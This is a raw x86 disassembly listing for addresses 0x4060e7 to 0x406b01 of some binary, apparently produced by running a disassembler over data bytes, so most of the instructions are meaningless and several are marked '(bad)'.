  4060e7:	in     eax,dx
  4060e8:	add    eax,DWORD PTR [edi]
  4060ea:	or     eax,0xd070345
  4060ef:	lea    eax,[ebx]
  4060f1:	pop    es
  4060f2:	or     eax,0xd080396
  4060f7:	push   ss
  4060f8:	add    al,0x8
  4060fa:	or     eax,0xd080356
  4060ff:	(bad)  
  406100:	add    ecx,DWORD PTR [eax]
  406102:	or     eax,0xd0803f6
  406107:	jbe    0x40610d
  406109:	or     BYTE PTR ds:0xd0803b6,cl
  40610f:	ss add al,0x8
  406112:	or     eax,0x803e900
  406117:	add    cl,bh
  406119:	add    edx,DWORD PTR [eax]
  40611b:	add    cl,ah
  40611d:	add    ecx,DWORD PTR [eax]
  40611f:	add    cl,dh
  406121:	add    edx,DWORD PTR [eax]
  406123:	add    ch,ch
  406125:	add    eax,DWORD PTR [eax]
	...
  406143:	add    BYTE PTR [eax],cl
  406145:	add    ch,dl
  406147:	add    edx,DWORD PTR [eax]
  406149:	add    ch,ah
  40614b:	add    ecx,DWORD PTR [eax]
  40614d:	add    ch,cl
  40614f:	add    edx,DWORD PTR [eax]
  406151:	add    bl,ch
  406153:	add    ecx,DWORD PTR [eax]
  406155:	add    bl,bh
  406157:	add    edx,DWORD PTR [eax]
  406159:	add    bl,ah
  40615b:	add    ecx,DWORD PTR [eax]
  40615d:	add    bl,dh
  40615f:	add    edx,DWORD PTR [eax]
  406161:	add    bh,ch
  406163:	add    ecx,DWORD PTR [eax]
  406165:	add    bh,dl
  406167:	add    edx,DWORD PTR [eax]
  406169:	add    bh,ah
  40616b:	add    ecx,DWORD PTR [eax]
  40616d:	add    bh,cl
  40616f:	add    edx,DWORD PTR [eax]
  406171:	add    al,ch
  406173:	add    ecx,DWORD PTR [eax]
  406175:	add    al,bh
  406177:	add    edx,DWORD PTR [eax]
  406179:	add    al,ah
  40617b:	add    ecx,DWORD PTR [eax]
  40617d:	add    al,dh
  40617f:	add    edx,DWORD PTR [eax]
  406181:	add    ah,ch
  406183:	add    ecx,DWORD PTR [eax]
  406185:	add    ah,dl
  406187:	add    edx,DWORD PTR [eax]
  406189:	add    ah,ah
  40618b:	add    ecx,DWORD PTR [eax]
  40618d:	add    ah,cl
  40618f:	add    edx,DWORD PTR [eax]
  406191:	add    dl,ch
  406193:	add    ecx,DWORD PTR [eax]
  406195:	add    dl,bh
  406197:	add    edx,DWORD PTR [eax]
  406199:	add    dl,ah
  40619b:	add    ecx,DWORD PTR [eax]
  40619d:	add    dl,dh
  40619f:	add    edx,DWORD PTR [eax]
  4061a1:	add    dh,ch
  4061a3:	add    ecx,DWORD PTR [eax]
  4061a5:	add    dh,dl
  4061a7:	add    eax,DWORD PTR [eax]
	...
  4061c5:	add    BYTE PTR [eax],dl
  4061c7:	add    BYTE PTR [eax],al
  4061c9:	jmp    0xe5435fd7
  4061ce:	adc    bh,ch
  4061d0:	add    al,0xef
  4061d2:	add    al,0xfa
  4061d4:	add    eax,0x6f917e6
  4061d9:	loope  0x4061f1
  4061db:	clc    
  4061dc:	pop    es
  4061dd:	loope  0x4061e5
  4061df:	clc    
  4061e0:	pop    es
  4061e1:	lock add edi,esi
  4061e4:	or     al,dh
  4061e6:	sbb    edi,esi
  4061e8:	or     bl,ah
  4061ea:	adc    dh,dh
  4061ec:	or     ebx,esp
  4061ee:	or     dh,dh
  4061f0:	or     ebx,esi
  4061f2:	add    dh,dh
  4061f4:	or     ebx,esi
  4061f6:	sbb    dh,dh
  4061f8:	or     edx,esp
  4061fa:	adc    ebp,esi
  4061fc:	or     ah,dl
  4061fe:	or     ebp,esi
  406200:	or     dh,dl
  406202:	add    ebp,esi
  406204:	or     dh,dl
  406206:	sbb    ebp,esi
  406208:	or     ah,ch
  40620a:	adc    dh,ah
  40620c:	or     ebx,ebp
  40620e:	or     dh,ah
  406210:	or     esi,ebp
  406212:	add    dh,ah
  406214:	or     ebp,ebp
  406216:	sbb    dh,ah
  406218:	or     esp,ebp
  40621a:	adc    dh,ah
  40621c:	or     ebx,ebp
  40621e:	or     dh,ah
  406220:	or     esi,ebp
  406222:	add    dh,ah
  406224:	or     ebp,ebp
  406226:	sbb    dh,ah
  406228:	or     esp,esp
	...
  406246:	add    BYTE PTR [eax],al
  406248:	adc    esi,ebx
  40624a:	or     al,0xdc
  40624c:	or     esi,ebx
  40624e:	or     al,0xf4
  406250:	add    esi,ebx
  406252:	or     al,0xec
  406254:	sbb    esi,ebx
  406256:	or     al,0xe4
  406258:	adc    esi,ebx
  40625a:	or     al,0xdc
  40625c:	or     esi,ebx
  40625e:	or     al,0x0
  406260:	cmp    edx,esi
  406262:	or     al,0xd
  406264:	cmp    edx,esi
  406266:	or     al,0xd
  406268:	sub    ch,bh
  40626a:	or     eax,0xdef3a0e
  40626f:	push   cs
  406270:	sbb    ch,bh
  406272:	or     eax,0xdeefa0e
  406277:	push   cs
  406278:	jmp    0xdee:0xda0e0dee
  40627f:	push   cs
  406280:	cli    
  406281:	out    dx,al
  406282:	or     eax,0xdeefa0e
  406287:	push   cs
  406288:	jmp    0xdee:0xba0e0dee
  40628f:	push   cs
  406290:	(bad)  
  406292:	or     eax,0xdeeba0e
  406297:	push   cs
  406298:	stos   BYTE PTR es:[edi],al
  406299:	out    dx,al
  40629a:	or     eax,0xdeeda0e
  40629f:	push   cs
  4062a0:	mov    edx,0xba0e0dee
  4062a5:	out    dx,al
  4062a6:	or     eax,0xeefab0e
  4062ab:	sldt   WORD PTR [eax]
	...
  4062ca:	mov    ebx,0x9b0f0eef
  4062cf:	out    dx,eax
  4062d0:	push   cs
  4062d1:	(bad)  
  4062d3:	out    dx,eax
  4062d4:	push   cs
  4062d5:	packssdw mm5,mm7
  4062d8:	push   cs
  4062d9:	cvtdq2ps xmm5,xmm7
  4062dc:	push   cs
  4062dd:	(bad)  
  4062df:	out    dx,eax
  4062e0:	push   cs
  4062e1:	(bad)  
  4062e3:	out    dx,eax
  4062e4:	push   cs
  4062e5:	packssdw mm5,mm7
  4062e8:	push   cs
  4062e9:	(bad)  
  4062eb:	out    dx,eax
  4062ec:	push   cs
  4062ed:	cvtdq2ps xmm5,xmm7
  4062f0:	push   cs
  4062f1:	(bad)  
  4062f3:	out    dx,eax
  4062f4:	push   cs
  4062f5:	prefetch BYTE PTR [edx-0x5df5f0f0]
  4062fc:	adc    BYTE PTR [edi],cl
  4062fe:	add    cl,BYTE PTR [edx-0x6de5f0f0]
  406304:	adc    BYTE PTR [edi],cl
  406306:	adc    dl,BYTE PTR [edi-0x5b03effd]
  40630c:	adc    eax,0x1782fe13
  406311:	adc    al,0x21
  406313:	je     0x40632b
  406315:	adc    eax,0x16197f18
  40631a:	and    esi,DWORD PTR [edi+0x19]
  40631d:	push   ss
  40631e:	sbb    ebx,DWORD PTR [esi+0x18]
  406321:	pop    ss
  406322:	add    dl,BYTE PTR [esi+0x18]
  406325:	pop    ss
  406326:	cli    
  406327:	push   eax
  406328:	sbb    ebx,DWORD PTR [eax]
  40632a:	cmc    
  40632b:	push   eax
  40632c:	sbb    ebx,DWORD PTR [eax]
	...
  40634a:	add    BYTE PTR [eax],al
  40634c:	cmc    
  40634d:	add    BYTE PTR [eax+ebx*1],bl
  406350:	and    eax,0x25181c01
  406355:	jo     0x406373
  406357:	sbb    DWORD PTR [eax+esi*2],edx
  40635a:	sbb    al,0x19
  40635c:	adc    al,0x60
  40635e:	sbb    al,0x19
  406360:	add    al,0x60
  406362:	sbb    al,0x19
  406364:	add    al,0x53
  406366:	sbb    DWORD PTR [edx],ebx
  406368:	not    DWORD PTR [edx+0x19]
  40636b:	sbb    dh,bh
  40636d:	add    bl,BYTE PTR [edx]
  40636f:	sbb    ah,BYTE PTR [edi]
  406371:	add    ebx,DWORD PTR [edx]
  406373:	sbb    ah,BYTE PTR [edi]
  406375:	jae    0x406390
  406377:	sbb    dl,BYTE PTR [edi]
  406379:	jae    0x406394
  40637b:	sbb    dl,BYTE PTR [edi]
  40637d:	arpl   WORD PTR [ecx],bx
  40637f:	sbb    al,BYTE PTR [edi]
  406381:	arpl   WORD PTR [ecx],bx
  406383:	sbb    al,BYTE PTR [edi]
  406385:	push   edx
  406386:	sbb    bl,BYTE PTR [ebx]
  406388:	not    BYTE PTR [ecx+0x1a]
  40638b:	sbb    esi,esi
  40638d:	inc    DWORD PTR [ecx]
  40638f:	sbb    esp,DWORD PTR [esi]
  406391:	sbb    eax,DWORD PTR [edx]
  406393:	sbb    esp,DWORD PTR [esi]
  406395:	sbb    esi,edx
  406397:	sbb    dl,BYTE PTR [esi]
  406399:	sbb    esi,edx
  40639b:	sbb    dl,BYTE PTR [esi]
  40639d:	sbb    esp,edx
  40639f:	sbb    al,BYTE PTR [esi]
  4063a1:	sbb    esp,edx
  4063a3:	sbb    al,BYTE PTR [esi]
  4063a5:	sbb    edx,ebp
  4063a7:	pop    ds
  4063a8:	stc    
  4063a9:	sbb    ecx,ebp
  4063ab:	pop    ds
  4063ac:	icebp  
  4063ad:	sbb    eax,DWORD PTR ds:0x20
	...
  4063cb:	add    BYTE PTR [eax],al
  4063cd:	add    BYTE PTR [ecx],ch
  4063cf:	sbb    al,0xfd
  4063d1:	pop    ds
  4063d2:	and    DWORD PTR [esi*8-0x12e3e6e1],ebx
  4063d9:	pop    ds
  4063da:	adc    DWORD PTR [eiz*8-0x22e3f6e1],ebx
  4063e1:	pop    ds
  4063e2:	add    DWORD PTR [edx*8-0x32e406e1],ebx
  4063e9:	pop    ds
  4063ea:	icebp  
  4063eb:	sbb    eax,DWORD PTR ds:0xfd1c2920
  4063f1:	pop    ds
  4063f2:	and    DWORD PTR [esi*8-0x12e3e6e1],ebx
  4063f9:	pop    ds
  4063fa:	adc    DWORD PTR [eiz*8-0x22e3f6e1],ebx
  406401:	pop    ds
  406402:	add    DWORD PTR [esp+edx*8],ebx
  406405:	and    al,bh
  406407:	sbb    al,0xcc
  406409:	and    al,dh
  40640b:	sbb    al,0x4
  40640d:	and    DWORD PTR [eax],ebp
  40640f:	sbb    eax,0x1d2020fc
  406414:	hlt    
  406415:	and    BYTE PTR [eax],bl
  406417:	sbb    eax,0x1d1020ec
  40641c:	in     al,0x20
  40641e:	or     BYTE PTR ds:0x1d0020dc,bl
  406424:	add    ah,dl
  406426:	sub    eax,0x2dcc1d1d
  40642b:	sbb    eax,0x1cec041d
  406430:	sbb    eax,0xfc
	...
  40644d:	add    BYTE PTR [eax],al
  40644f:	add    ch,ch
  406451:	sbb    al,0x1d
  406453:	hlt    
  406454:	in     eax,dx
  406455:	sbb    al,0x1d
  406457:	in     al,dx
  406458:	in     eax,dx
  406459:	sbb    al,0x1d
  40645b:	in     al,0xed
  40645d:	sbb    al,0x1d
  40645f:	fsub   st(5),st
  406461:	sbb    al,0x1d
  406463:	jmp    0xe5436679
  406468:	add    eax,0x16f10706
  40646d:	pop    es
  40646e:	or     ebx,esi
  406470:	adc    al,0x9
  406472:	or     esp,ebp
  406474:	or     cl,BYTE PTR [esp+ecx*1]
  406477:	fcomp  QWORD PTR ds:0x18f70d0b
  40647d:	push   cs
  40647e:	push   cs
  40647f:	out    dx,al
  406480:	adc    ecx,DWORD PTR ds:0xffed90f
  406486:	adc    cl,bl
  406488:	dec    BYTE PTR [edi]
  40648a:	adc    al,bh
  40648c:	pop    ds
  40648d:	movups xmm0,xmm7
  406490:	pop    ds
  406491:	movups xmm3,xmm7
  406494:	sbb    al,0x12
  406496:	adc    bh,bl
  406498:	sbb    al,0x12
  40649a:	adc    bl,dl
  40649c:	std    
  40649d:	adc    BYTE PTR [ebx],dl
  40649f:	(bad)  
  4064a1:	adc    BYTE PTR [ebx],dl
  4064a3:	fld    QWORD PTR [edx]
  4064a5:	adc    al,0x14
  4064a7:	aad    0xfa
  4064a9:	adc    edx,DWORD PTR [edi*8-0xaebebde]
  4064b0:	sbb    dl,BYTE PTR [esp+edx*1]
  4064b3:	cld    
	...
  4064d0:	add    BYTE PTR [eax],al
  4064d2:	and    edx,DWORD PTR [ebx]
  4064d4:	adc    eax,0x15131bf4
  4064d9:	add    BYTE PTR [ecx+0x16],cl
  4064dc:	adc    eax,0x15163915
  4064e1:	adc    eax,0x1616133a
  4064e6:	cmp    dl,BYTE PTR [ebx]
  4064e8:	push   ss
  4064e9:	push   ss
  4064ea:	dec    edx
  4064eb:	adc    edx,DWORD PTR [esi]
  4064ed:	push   ss
  4064ee:	cmp    dl,BYTE PTR [ebx]
  4064f0:	push   ss
  4064f1:	push   ss
  4064f2:	cmp    edx,DWORD PTR [edi+edx*1]
  4064f5:	pop    ss
  4064f6:	cmp    edx,DWORD PTR [edi+edx*1]
  4064f9:	pop    ss
  4064fa:	dec    ebx
  4064fb:	adc    al,0x17
  4064fd:	pop    ss
  4064fe:	cmp    edx,DWORD PTR [edi+edx*1]
  406501:	pop    ss
  406502:	cmp    al,0x19
  406504:	sbb    BYTE PTR [eax],bl
  406506:	cmp    al,0x19
  406508:	sbb    BYTE PTR [eax],bl
  40650a:	or     al,0x1c
  40650c:	sbb    BYTE PTR [eax],bl
  40650e:	or     al,0x1c
  406510:	sbb    BYTE PTR [eax],bl
  406512:	cld    
  406513:	sbb    BYTE PTR [eax],bl
  406515:	sbb    ah,bh
  406517:	sbb    BYTE PTR [eax],bl
  406519:	sbb    ah,ch
  40651b:	sbb    BYTE PTR [eax],bl
  40651d:	sbb    ah,ch
  40651f:	sbb    BYTE PTR [eax],bl
  406521:	sbb    BYTE PTR [ebp-0x42e6e6e7],bh
  406527:	sbb    DWORD PTR [ecx],ebx
  406529:	sbb    DWORD PTR ds:0xd191919,ecx
  40652f:	sbb    DWORD PTR [ecx],ebx
  406531:	sbb    DWORD PTR [ebp+0x191919],edi
	...
  406553:	add    BYTE PTR [ebp-0x52e6e6e7],bh
  406559:	sbb    DWORD PTR [ecx],ebx
  40655b:	sbb    DWORD PTR [ebp-0x41e6e6e7],ebp
  406561:	push   ss
  406562:	sbb    bl,BYTE PTR [edx]
  406564:	mov    esi,0xe1a1a16
  406569:	sbb    bl,BYTE PTR [edx]
  40656b:	sbb    cl,BYTE PTR [esi]
  40656d:	sbb    bl,BYTE PTR [edx]
  40656f:	sbb    cl,BYTE PTR ds:0x171a1971
  406575:	jno    0x406590
  406577:	sbb    al,BYTE PTR [edi]
  406579:	popa   
  40657a:	sbb    DWORD PTR [edx],ebx
  40657c:	pop    es
  40657d:	popa   
  40657e:	sbb    DWORD PTR [edx],ebx
  406580:	not    DWORD PTR [ecx+0x18]
  406583:	sbb    esi,esi
  406585:	push   ecx
  406586:	sbb    BYTE PTR [ebx],bl
  406588:	add    bl,BYTE PTR es:[ecx]
  40658b:	sbb    esp,DWORD PTR [esi]
  40658d:	add    bl,BYTE PTR [ecx]
  40658f:	sbb    edx,DWORD PTR [esi]
  406591:	jb     0x4065ab
  406593:	sbb    edx,DWORD PTR [esi]
  406595:	jb     0x4065af
  406597:	sbb    eax,DWORD PTR [esi]
  406599:	bound  ebx,QWORD PTR [eax]
  40659b:	sbb    eax,DWORD PTR [esi]
  40659d:	bound  ebx,QWORD PTR [eax]
  40659f:	sbb    edi,ecx
  4065a1:	add    ax,WORD PTR [eax]
  4065a4:	or     eax,0xd000368
  4065a9:	add    eax,DWORD PTR [bx+si]
  4065ac:	or     eax,0xd000366
  4065b1:	ins    DWORD PTR es:[edi],dx
  4065b2:	add    eax,DWORD PTR [eax]
  4065b4:	or     eax,0x364
	...
  4065d5:	add    BYTE PTR ds:0xd00036b,cl
  4065db:	bound  eax,QWORD PTR [ebx]
  4065dd:	add    BYTE PTR ds:0xd000361,cl
  4065e3:	pop    edi
  4065e4:	add    eax,DWORD PTR [eax]
  4065e6:	or     eax,0xd000375
  4065eb:	imul   eax,DWORD PTR [ebx],0x0
  4065ee:	or     eax,0xd000379
  4065f3:	jne    0x4065f8
  4065f5:	add    BYTE PTR ds:0xd000361,cl
  4065fb:	pop    ebp
  4065fc:	add    eax,DWORD PTR [eax]
  4065fe:	or     eax,0xd000409
  406603:	add    DWORD PTR [eax+eax*1],eax
  406606:	or     eax,0xd03d900
  40660b:	add    cl,ah
  40660d:	add    ecx,DWORD PTR ds:0xd042900
  406613:	add    BYTE PTR [ecx],bh
  406615:	add    al,0xd
  406617:	add    BYTE PTR [ecx],cl
  406619:	add    al,0xd
  40661b:	add    cl,bh
  40661d:	add    ecx,DWORD PTR ds:0xd046900
  406623:	add    BYTE PTR [ecx+0x4],cl
  406626:	or     eax,0xd042900
  40662b:	add    BYTE PTR [ecx+0x4],cl
  40662e:	or     eax,0xd03e900
  406633:	add    cl,ch
  406635:	add    ecx,DWORD PTR ds:0x3e900
	...
  406657:	add    BYTE PTR ds:0xd03e800,cl
  40665d:	add    bl,ch
  40665f:	add    ecx,DWORD PTR ds:0xd03ea00
  406665:	add    ch,ch
  406667:	add    ecx,DWORD PTR ds:0xd03e700
  40666d:	add    cl,ah
  40666f:	add    ecx,DWORD PTR ds:0xd03dd00
  406675:	add    cl,bl
  406677:	add    ecx,DWORD PTR ds:0xd03e100
  40667d:	add    cl,cl
  40667f:	add    ecx,DWORD PTR ds:0xd03b900
  406685:	add    BYTE PTR [ecx],ch
  406687:	add    al,0xd
  406689:	add    BYTE PTR [ecx+0x4],cl
  40668c:	or     eax,0xd036900
  406691:	add    BYTE PTR [ecx-0x16fff2fd],ch
  406697:	add    al,0xd
  406699:	add    BYTE PTR [ecx+0x4],ch
  40669c:	or     eax,0x8e90000
  4066a1:	add    BYTE PTR [eax],al
  4066a3:	jmp    0xe94066bb
  4066a8:	cmp    BYTE PTR [edx-0x1],0xe9
  4066ac:	or     al,0x0
  4066ae:	add    cl,ch
  4066b0:	push   es
  4066b1:	add    BYTE PTR [eax],al
  4066b3:	jmp    0xe94066ca
  4066b8:	(bad)  
  4066b9:	(bad)  
  4066ba:	(bad)  
  4066bb:	call   0x4066c0
	...
  4066d8:	add    BYTE PTR [eax],al
  4066da:	idiv   bh
  4066dc:	(bad)  
  4066dd:	call   0xe9406710
  4066e2:	(bad)  
  4066e3:	(bad)  
  4066e4:	(bad)  
  4066e5:	call   0xea3fe138
  4066ea:	cs jp  0x4066ec
  4066ed:	jmp    0x20e:0xe400040e
  4066f4:	add    dh,ch
  4066f6:	push   cs
  4066f7:	or     BYTE PTR [eax],al
  4066f9:	lock push cs
  4066fb:	push   es
  4066fc:	add    dl,ah
  4066fe:	push   cs
  4066ff:	or     eax,0xf0ede00
  406704:	add    dl,bh
  406706:	push   cs
  406707:	adc    DWORD PTR [eax],eax
  406709:	add    dl,BYTE PTR [ecx]
  40670b:	sbb    DWORD PTR [eax],eax
  40670d:	retf   0x250e
  406710:	add    dl,bl
  406712:	push   cs
  406713:	xor    eax,0xcd0eaa00
  406718:	dec    DWORD PTR [ecx+0x69ffed0e]
  40671e:	push   cs
  40671f:	popf   
  406720:	add    BYTE PTR [edx],ch
  406722:	push   cs
  406723:	pop    ebp
  406724:	add    bl,ch
  406726:	sldt   WORD PTR [eax]
  406729:	jmp    0xf940673c
  40672e:	push   cs
  40672f:	adc    BYTE PTR [eax],al
  406731:	stc    
  406732:	push   cs
  406733:	adc    BYTE PTR [eax],al
  406735:	add    ah,al
  406737:	std    
  406738:	(bad)  
  40673a:	mov    ah,0xfd
  40673c:	sldt   WORD PTR [eax]
	...
  40675b:	add    BYTE PTR [ebp+0x650010fd],dh
  406761:	std    
  406762:	adc    BYTE PTR [eax],al
  406764:	xchg   ch,bh
  406766:	adc    DWORD PTR [eax],eax
  406768:	jbe    0x406767
  40676a:	adc    DWORD PTR [eax],eax
  40676c:	ja     0x40676b
  40676e:	adc    al,BYTE PTR [eax]
  406770:	addr16 std 
  406772:	adc    al,BYTE PTR [eax]
  406774:	inc    eax
  406775:	std    
  406776:	adc    eax,DWORD PTR [eax]
  406778:	inc    eax
  406779:	std    
  40677a:	adc    eax,DWORD PTR [eax]
  40677c:	xor    ebp,edi
  40677e:	adc    al,0x0
  406780:	popa   
  406781:	std    
  406782:	adc    al,0x0
  406784:	inc    esp
  406785:	std    
  406786:	retf   0x7100
  406789:	std    
  40678a:	(bad)  
  40678b:	jmp    DWORD PTR ds:0x370001fd
  406791:	std    
  406792:	add    eax,DWORD PTR [eax]
  406794:	xor    ebp,edi
  406796:	push   es
  406797:	add    BYTE PTR ds:0x35000cfd,bl
  40679d:	std    
  40679e:	sbb    BYTE PTR [eax],al
  4067a0:	adc    eax,0xb5003104
  4067a5:	cld    
  4067a6:	pusha  
  4067a7:	add    BYTE PTR [ebp+0x4],ah
  4067aa:	rol    DWORD PTR [eax],0xe5
  4067ad:	std    
  4067ae:	add    BYTE PTR [ecx],0xf5
  4067b1:	add    al,BYTE PTR [ecx]
  4067b3:	add    esi,ebp
  4067b5:	js     0x4067b7
  4067b7:	push   es
  4067b8:	in     eax,0x4
  4067ba:	add    DWORD PTR [eiz*8+0x18010c],ecx
	...
  4067dd:	add    BYTE PTR [ebp-0x4acffee4],dh
  4067e3:	cmp    al,0x0
  4067e5:	pusha  
  4067e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067e7:	cld    
  4067e8:	(bad)  
  4067e9:	dec    DWORD PTR ds:0xd100377
  4067ef:	ja     0x4067f4
  4067f1:	adc    BYTE PTR ds:0xd110358,cl
  4067f7:	push   ebp
  4067f8:	add    edx,DWORD PTR [edx]
  4067fa:	or     eax,0xd130356
  4067ff:	push   ebx
  406800:	add    edx,DWORD PTR [ecx*1+0xd15037c]
  406807:	jno    0x40680c
  406809:	push   ss
  40680a:	or     eax,0xd17037a
  40680f:	outs   dx,DWORD PTR ds:[esi]
  406810:	add    ebx,DWORD PTR [eax]
  406812:	or     eax,0xd190360
  406817:	pop    ebp
  406818:	add    ebx,DWORD PTR [edx]
  40681a:	or     eax,0xd1b034e
  40681f:	dec    ebx
  406820:	add    ebx,DWORD PTR [ecx*1+0xd1d0404]
  406827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406828:	add    eax,DWORD PTR [eax+0xd]
  40682b:	mov    al,ds:0xbaac75e9
  406830:	jmp    0xac71:0xe2b6ed63
  406837:	dec    ebx
  406838:	fidiv  WORD PTR [ebx-0x58]
  40683b:	mov    ah,0x23
  40683d:	jo     0x4068ab
  40683f:	mov    edx,0x64f4
	...
  406860:	imul   ecx,DWORD PTR [ecx-0x11],0x23aa2d6e
  406867:	jb     0x4068e1
  406869:	jg     0x40685a
  40686b:	push   0x66237c78
  406870:	pop    eax
  406871:	(bad)  
  406872:	in     al,0x73
  406874:	fs xchg cl,ch
  406877:	sub    eax,0x36907
  40687c:	or     eax,0xd434019
  406881:	add    BYTE PTR [ecx],cl
  406883:	dec    esp
  406884:	dec    esi
  406885:	add    cl,ch
  406887:	add    ecx,DWORD PTR ds:0x8d83ef00
  40688d:	jle    0x4068f8
  40688f:	test   DWORD PTR [ebp+0xe13e900],ecx
  406895:	jle    0x406900
  406897:	jle    0x406828
  406899:	sbb    ch,0x0
  40689c:	adc    BYTE PTR [ebp+0x7d89c123],bh
  4068a2:	ins    BYTE PTR es:[edi],dx
  4068a3:	add    DWORD PTR ds:0x8d33d900,ecx
  4068a9:	shr    BYTE PTR [eax-0x7c],1
  4068ac:	or     eax,0x2a2be908
  4068b1:	cmp    BYTE PTR [ecx],bl
  4068b3:	iret   
  4068b4:	(bad)  
  4068b6:	in     eax,0x3
  4068b8:	sbb    dh,BYTE PTR [eax]
  4068ba:	mov    ecx,0xe987dad3
  4068bf:	add    ecx,DWORD PTR ds:0x841120
	...
  4068e1:	add    BYTE PTR [ebp+0xd046980],al
  4068e7:	add    cl,cl
  4068e9:	jecxz  0x4068b5
  4068eb:	out    0xc0,eax
  4068ed:	jmp    0x4068f9
  4068ef:	or     dh,ch
  4068f1:	sti    
  4068f2:	stos   BYTE PTR es:[edi],al
  4068f3:	out    dx,eax
  4068f4:	mov    ch,0xf3
  4068f6:	mov    ds:0xd03e107,al
  4068fb:	or     cl,ch
  4068fd:	or     ecx,DWORD PTR ds:0xd03f0ff
  406903:	add    cl,ch
  406905:	add    ecx,DWORD PTR ds:0x205b4600
  40690b:	pop    ds
  40690c:	inc    eax
  40690d:	jns    0x406927
  40690f:	pop    ds
  406910:	add    cl,BYTE PTR [edx+0x55500e61]
  406916:	sbb    BYTE PTR [edi],bl
  406918:	add    BYTE PTR [ecx+0x68],al
  40691b:	sub    al,0x27
  40691d:	imul   edi,DWORD PTR [eax+0x21bd5b42],0xffffff9d
  406924:	sbb    edx,DWORD PTR fs:[ebx]
  406927:	xlat   BYTE PTR ds:[ebx]
  406928:	lea    edi,[esi-0x2c]
  40692b:	sub    al,0x2c
  40692d:	mov    dh,0x38
  40692f:	push   eax
  406930:	xchg   esp,eax
  406931:	pusha  
  406932:	stos   BYTE PTR es:[edi],al
  406933:	fldcw  WORD PTR [ebp+0x108dee47]
  406939:	dec    ebp
  40693a:	shr    DWORD PTR [ebp-0x6a],1
  40693d:	push   0x31
  40693f:	in     eax,0xeb
  406941:	cs shl ebx,1
  406944:	es leave 
	...
  406962:	add    BYTE PTR [eax],al
  406964:	stos   DWORD PTR es:[edi],eax
  406965:	push   ss
  406966:	sub    eax,0xcd74cbb4
  40696b:	fxch   st(7)
  40696d:	sub    bl,ch
  40696f:	pop    ecx
  406970:	push   es
  406971:	test   al,0xd7
  406973:	pop    ss
  406974:	dec    DWORD PTR [esi+0x6f607439]
  40697a:	mov    BYTE PTR [edi+0x24],ch
  40697d:	lds    esp,FWORD PTR [esi+0x23d9e8da]
  406983:	test   DWORD PTR [ebp+edx*1+0x19082476],esi
  40698a:	xchg   esp,eax
  40698b:	inc    eax
  40698c:	adc    DWORD PTR [eax],eax
  40698e:	jle    0x406934
  406990:	fmul   st,st(3)
  406992:	loopne 0x406a00
  406994:	xchg   ebx,eax
  406995:	scas   al,BYTE PTR es:[edi]
  406996:	enter  0x2698,0x2
  40699a:	xor    ebp,DWORD PTR [ebx+0x23c76bfe]
  4069a0:	sub    cl,BYTE PTR [edx]
  4069a2:	xlat   BYTE PTR ds:[ebx]
  4069a3:	sub    dl,BYTE PTR [ecx-0x72b8b199]
  4069a9:	push   edx
  4069aa:	or     DWORD PTR [edx-0x57],esi
  4069ad:	and    eax,0x290d0060
  4069b2:	mov    eax,0x6201b27f
  4069b7:	int3   
  4069b8:	cmp    ebx,DWORD PTR [esi+0x6f]
  4069bb:	jne    0x406a20
  4069bd:	arpl   WORD PTR [edi],ax
  4069bf:	ss sahf 
  4069c1:	mov    BYTE PTR [esi-0x6c],al
  4069c4:	dec    ecx
  4069c5:	int    0x87
  4069c7:	mov    bl,0x0
	...
  4069e5:	add    BYTE PTR [edi],ch
  4069e7:	pop    ebp
  4069e8:	mov    dh,0x46
  4069ea:	in     eax,0x5c
  4069ec:	adc    eax,0x1ae19276
  4069f1:	mov    edx,0xc0139f62
  4069f6:	sub    eax,edx
  4069f8:	(bad)  
  4069fa:	dec    ebp
  4069fb:	retf   
  4069fc:	push   eax
  4069fd:	in     eax,0x3a
  4069ff:	mov    eax,ds:0x98d6f368
  406a04:	(bad)  
  406a05:	ret    
  406a06:	jle    0x406a82
  406a08:	sbb    eax,DWORD PTR [edx]
  406a0a:	xchg   ebx,eax
  406a0b:	xchg   ecx,eax
  406a0c:	pop    ebp
  406a0d:	xor    eax,0x77af9fe8
  406a12:	jmp    0x406a54
  406a14:	jns    0x406a48
  406a16:	mov    eax,0xced4dca8
  406a1b:	jg     0x4069a3
  406a1d:	jg     0x4069a1
  406a1f:	in     eax,dx
  406a20:	sbb    ecx,DWORD PTR [ebx-0x2b2688bd]
  406a26:	lock inc esp
  406a28:	add    ebx,DWORD PTR [ebp+0x5ea67fa6]
  406a2e:	mov    ?,WORD PTR [ebx-0x993b647]
  406a34:	jecxz  0x406a78
  406a36:	dec    ebp
  406a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a38:	shr    DWORD PTR [eax-0x5e],1
  406a3b:	daa    
  406a3c:	retf   
  406a3d:	pop    ecx
  406a3e:	pop    eax
  406a3f:	in     eax,dx
  406a40:	shl    ebx,1
  406a42:	fidivr WORD PTR [esi]
  406a44:	jp     0x4069da
  406a46:	or     eax,0xbbb667
	...
  406a67:	add    BYTE PTR [esi+edi*1-0x76a9fd7a],ah
  406a6e:	or     BYTE PTR [esi],dh
  406a70:	mov    edx,0xdbc7b4ec
  406a75:	push   ss
  406a76:	shl    DWORD PTR [ebx-0x69],1
  406a79:	add    ax,WORD PTR [eax]
  406a7c:	or     eax,0xd000367
  406a81:	jecxz  0x406afb
  406a83:	inc    ecx
  406a84:	or     eax,0xd417913
  406a89:	add    eax,DWORD PTR [bx+si]
  406a8c:	or     eax,0xd4177e4
  406a91:	cli    
  406a92:	ja     0x406ad5
  406a94:	or     eax,0xd000380
  406a99:	out    0x0,eax
  406a9b:	add    BYTE PTR ds:0xd000344,cl
  406aa1:	rol    DWORD PTR [edx],1
  406aa3:	add    BYTE PTR ds:0xd000487,cl
  406aa9:	cmp    al,0x3
  406aab:	add    BYTE PTR ds:0xd0002d2,cl
  406ab1:	xchg   DWORD PTR [eax+eax*1],eax
  406ab4:	or     eax,0xd000344
  406ab9:	xor    eax,DWORD PTR [ebx]
  406abb:	add    BYTE PTR ds:0xd0000e7,cl
  406ac1:	cld    
  406ac2:	add    eax,DWORD PTR [eax]
  406ac4:	or     eax,0xd00037c
  406ac9:	out    0x0,eax
	...
  406ae7:	add    BYTE PTR [eax],al
  406ae9:	add    BYTE PTR ds:0xd000404,cl
  406aef:	test   DWORD PTR [ebx],eax
  406af1:	add    BYTE PTR ds:0xd0000e9,cl
  406af7:	cld    
  406af8:	add    eax,DWORD PTR [eax]
  406afa:	or     eax,0xd035600
  406aff:	add    BYTE PTR [ecx],cl
  406b01:	add    al,0xd
